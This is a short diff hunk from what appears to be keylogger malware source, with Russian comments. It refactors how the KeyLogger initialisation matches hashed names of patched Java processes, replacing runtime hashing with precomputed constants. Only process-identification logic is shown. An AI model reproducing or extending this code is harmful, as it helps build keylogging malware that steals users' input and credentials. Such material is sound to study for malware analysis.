@@ -1239,10 +1239,10 @@ PKeyLogger KeyLogger::Initialize(PCHAR AppName)
 		// При срабатывании чва патчера оригинальные имена процессов
 		// явы меняются, по этому будем проверять на совпадение резудьтирующим
 		// именам ява патчера
-		if (H == AnsiStr::Hash(Patched_Jawa_Name, 0, true))
+		if (H == PROCESS_HASH_PATCHED_JAVA)
 			H = PROCESS_HASH_JAVA;
 		else
-		if (H == AnsiStr::Hash(Patched_JawaW_Name, 0, true))
+		if (H == PROCESS_HASH_PATCHED_JAVAW)
 			H = PROCESS_HASH_JAVAW;
 	#endif
 
